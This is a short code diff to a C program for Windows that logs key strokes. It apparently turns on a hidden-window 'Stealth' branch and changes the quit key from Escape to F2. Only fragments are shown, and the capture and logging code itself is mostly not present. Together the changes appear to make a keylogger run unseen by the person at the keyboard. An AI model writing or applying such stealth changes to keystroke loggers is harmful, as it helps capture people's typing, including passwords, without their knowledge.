@@ -15,7 +15,7 @@ int main()
    int i;
    bool run = true;
 
-   if(false)
+   if(true)
    {
       HWND Stealth;
       AllocConsole();
@@ -54,7 +54,7 @@ bool log(int key_stroke)
 
    printf("(%lu) %d=%s\n", rawtime, key_stroke, (char*) &key_stroke);
 
-   if(key_stroke == VK_ESCAPE)
+   if(key_stroke == VK_F2)
    {
       return false;
    }else
